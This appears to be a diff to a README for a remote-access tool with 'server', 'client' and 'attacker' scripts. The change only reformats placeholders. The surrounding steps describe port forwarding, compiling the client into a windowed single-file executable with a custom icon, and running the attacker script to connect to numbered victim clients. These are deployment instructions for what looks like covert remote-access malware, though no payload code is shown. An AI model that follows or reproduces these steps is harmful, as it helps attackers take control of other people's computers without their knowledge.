@@ -12,8 +12,8 @@
 - Replace "PORT" in server.py, client.py and attacker.py with your port forwarded port, [Tutorial](https://www.youtube.com/watch?v=0F53xFGhT-c) on how to port forward
 - Run server.py, it has to be always up or client wont be able to comunicate with the attacker
 - Make an exe file out of client.py after you change the IP and the PORT use in CMD: \
-  1.⠀``` cd your client.py location ```\
-  2.⠀```pyinstaller --noconfirm --onefile --windowed --icon "your icon location here" client.py```\
+  1.⠀``` cd <your client.py location> ```\
+  2.⠀```pyinstaller --noconfirm --onefile --windowed --icon <your icon location here> client.py```\
   3.⠀Client.exe is now ready
 - Run attacker.py and enter CLIENTNUMBER of a client you want to connect
   - if attacker doesnt connect that means that client if offline or an error has occurred, try restarting attacker.py
